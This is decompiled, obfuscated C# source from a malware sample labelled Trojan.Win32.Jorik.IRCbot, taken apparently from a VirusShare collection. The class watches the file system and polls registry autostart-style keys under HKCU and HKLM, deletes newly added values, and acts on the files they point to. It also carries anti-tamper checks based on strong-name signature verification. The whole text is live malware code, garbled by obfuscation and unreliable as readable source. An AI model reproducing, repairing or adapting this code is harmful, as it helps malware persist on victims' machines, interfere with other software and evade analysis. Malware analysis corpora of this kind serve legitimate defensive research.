// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0005;
using \u0007;
using \u000E;
using \u000F;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;

namespace \u0005
{
  internal sealed class \u0002
  {
    private static List<string> \u0001;
    public static bool \u0001;
    private static FileSystemWatcher \u0001;
    [NonSerialized]
    internal static \u0008.\u0004 \u007F;

    public static void \u0001()
    {
      \u0002.\u0001 = true;
      \u0002.\u0001 = \u0002.\u0001();
      \u0012.\u007E\u0094((object) \u0002.\u0001, global::\u0004.\u001C(\u0002.\u007F(398)));
      \u0088\u0002.\u007E\u0016\u0004((object) \u0002.\u0001, NotifyFilters.DirectoryName);
      \u0088\u0002 obj = \u0088\u0002.\u007E\u0016\u0004;
      FileSystemWatcher fileSystemWatcher = \u0002.\u0001;
      int num = (int) (\u0089\u0002.\u007E\u0017\u0004((object) \u0002.\u0001) | NotifyFilters.FileName);
      if (true)
        goto label_23;
label_2:
      \u0088\u0002.\u007E\u0016\u0004((object) \u0002.\u0001, \u0089\u0002.\u007E\u0017\u0004((object) \u0002.\u0001) | NotifyFilters.Attributes);
      \u008A\u0002.\u007E\u0018\u0004((object) \u0002.\u0001, new FileSystemEventHandler(\u0002.\u0001));
      try
      {
        \u0084.\u007E\u0099\u0002((object) \u0002.\u0001, true);
      }
      catch
      {
      }
      while (\u0002.\u0001)
      {
        foreach (string str in global::\u000E.\u007E\u008A((object) \u000F\u0002.\u007E\u0091\u0003((object) Registry.CurrentUser, \u0002.\u007F(420), false)))
        {
          if (!\u0002.\u0001.Contains(str))
          {
            \u0002.\u0001(\u0011.\u008E(\u0002.\u007F(3896), \u0002.\u0001(\u0010.\u008D(\u0002.\u007F(609), str)), \u0002.\u007F(523)), \u0001.\u0013);
            try
            {
              \u0012.\u007E\u008F((object) \u000F\u0002.\u007E\u0091\u0003((object) Registry.CurrentUser, \u0002.\u007F(420), true), str);
              \u0002.\u0001(\u0011.\u008E(\u0002.\u007F(3941), \u0002.\u0001(\u0010.\u008D(\u0002.\u007F(609), str)), \u0002.\u007F(523)), \u0001.\u0013);
              \u0002.\u0001(\u0003.\u007E\u0005(global::\u000F.\u007E\u008B((object) \u000F\u0002.\u007E\u0091\u0003((object) Registry.LocalMachine, \u0002.\u007F(420), false), str)));
            }
            catch
            {
            }
            \u0002.\u0001.Add(str);
          }
        }
        foreach (string str in global::\u000E.\u007E\u008A((object) \u000F\u0002.\u007E\u0091\u0003((object) Registry.LocalMachine, \u0002.\u007F(420), false)))
        {
          if (!\u0002.\u0001.Contains(str))
          {
            \u0002.\u0001(\u0011.\u008E(\u0002.\u007F(3970), \u0002.\u0001(\u0010.\u008D(\u0002.\u007F(609), str)), \u0002.\u007F(523)), \u0001.\u0013);
            try
            {
              \u0012.\u007E\u008F((object) \u000F\u0002.\u007E\u0091\u0003((object) Registry.LocalMachine, \u0002.\u007F(420), true), str);
              \u0002.\u0001(\u0011.\u008E(\u0002.\u007F(3941), \u0002.\u0001(\u0010.\u008D(\u0002.\u007F(609), str)), \u0002.\u007F(523)), \u0001.\u0013);
              \u0002.\u0001(\u0003.\u007E\u0005(global::\u000F.\u007E\u008B((object) \u000F\u0002.\u007E\u0091\u0003((object) Registry.LocalMachine, \u0002.\u007F(420), false), str)));
            }
            catch
            {
            }
            \u0002.\u0001.Add(str);
          }
        }
        \u001F.\u0087\u0002(3000);
      }
      return;
label_23:
      obj((object) fileSystemWatcher, (NotifyFilters) num);
      goto label_2;
    }

    public static void \u0001([In] string obj0)
    {
      \u0002.\u0001(\u0011.\u008E(\u0002.\u007F(4015), \u0002.\u0001(\u0010.\u008D(\u0002.\u007F(609), obj0)), \u0002.\u007F(523)), \u0001.\u0013);
      if (!\u0011\u0002.\u0094\u0003(obj0))
        return;
      if (\u0001.\u0001(obj0))
      {
        \u0002.\u0001(\u0011.\u008E(\u0002.\u007F(4028), \u0002.\u0001(\u0010.\u008D(\u0002.\u007F(609), obj0)), \u0002.\u007F(523)), \u0001.\u0013);
      }
      else
      {
        string str = \u0011.\u008E(global::\u0004.\u001E(obj0), \u0002.\u007F(4113), \u0002.\u0001(5));
        if (!\u0001.\u0001(obj0, str))
          return;
        string[] strArray = new string[5]
        {
          \u0002.\u007F(4118),
          \u0002.\u0001(\u0010.\u008D(\u0002.\u007F(609), obj0)),
          \u0002.\u007F(614),
          \u0002.\u0001(\u0010.\u008D(\u0002.\u007F(609), str)),
          \u0002.\u007F(523)
        };
        \u0002.\u0001(\u0018.\u001A\u0002(strArray), \u0001.\u0013);
      }
    }

    public static void \u0001([In] object obj0, [In] FileSystemEventArgs obj1)
    {
label_0:
      if (!\u0002.\u0001)
        goto label_7;
label_1:
      WatcherChangeTypes watcherChangeTypes;
      if (true)
      {
        watcherChangeTypes = \u008B\u0002.\u007E\u0019\u0004((object) obj1);
        goto label_8;
      }
      else
        goto label_0;
label_7:
      if (true)
        return;
label_8:
      if (watcherChangeTypes != WatcherChangeTypes.Created)
        return;
      if (true)
      {
        \u001F.\u0087\u0002(2000);
        \u0002.\u0001(\u0003.\u007E\u0013((object) obj1));
        goto label_7;
      }
      else
        goto label_1;
    }

    private static List<string> \u0001()
    {
      if (true)
        goto label_19;
label_4:
      string str1;
      List<string> stringList;
      if (!stringList.Contains(str1))
        stringList.Add(str1);
      int index1;
      int num1 = index1 + 1;
label_7:
      index1 = num1;
label_8:
      string[] valueNames1;
      do
      {
        int num2 = index1;
        while (true)
        {
          int length1 = valueNames1.Length;
          if (num2 >= length1)
          {
            string[] valueNames2 = Registry.LocalMachine.OpenSubKey(\u0002.\u007F(420), false).GetValueNames();
            int index2 = 0;
            int num3;
            while (true)
            {
              num3 = index2;
              if (true)
                goto label_16;
label_14:
              index2 = num3;
              continue;
label_16:
              if (true)
              {
                int length2 = valueNames2.Length;
                if (num3 < length2)
                {
                  string str2 = valueNames2[index2];
                  if (!stringList.Contains(str2))
                    stringList.Add(str2);
                  num3 = index2 + 1;
                  goto label_14;
                }
                else
                  goto label_18;
              }
              else
                break;
            }
            num2 = num3;
          }
          else
            break;
        }
      }
      while (false);
      goto label_21;
label_18:
      return stringList;
label_21:
      str1 = valueNames1[index1];
      goto label_4;
label_19:
      stringList = new List<string>();
      if (true)
      {
        valueNames1 = Registry.CurrentUser.OpenSubKey(\u0002.\u007F(420), false).GetValueNames();
        int num4 = 0;
        if (num4 != 0)
        {
          num1 = num4;
          goto label_7;
        }
        else
        {
          index1 = num4;
          goto label_8;
        }
      }
      else
        goto label_8;
    }

    static \u0002()
    {
      bool flag;
      if (true)
      {
        \u0004.\u0005.\u0001(typeof (\u0002));
        flag = false;
      }
      else
        goto label_4;
label_2:
      Assembly assembly = \u007F.\u0089\u0002();
      if (\u0002.\u0001(\u0003.\u007E\u0006((object) assembly), true, out flag))
        goto label_11;
label_5:
      throw new SecurityException(\u0002.\u007F(722));
label_11:
      int num = flag ? 1 : 0;
      if (true)
      {
        if (num == 0 || !global::\u0005.\u007E\u0082((object) \u0003.\u007E\u0007((object) assembly), \u0002.\u007F(697)))
          goto label_5;
      }
      else
        goto label_7;
label_4:
      if (true)
        num = 0;
      else
        goto label_8;
label_7:
      \u0002.\u0001 = num != 0;
label_8:
      if (true)
      {
        if (true)
          \u0002.\u0001 = new FileSystemWatcher();
        else
          goto label_2;
      }
      else
        goto label_4;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);
  }
}
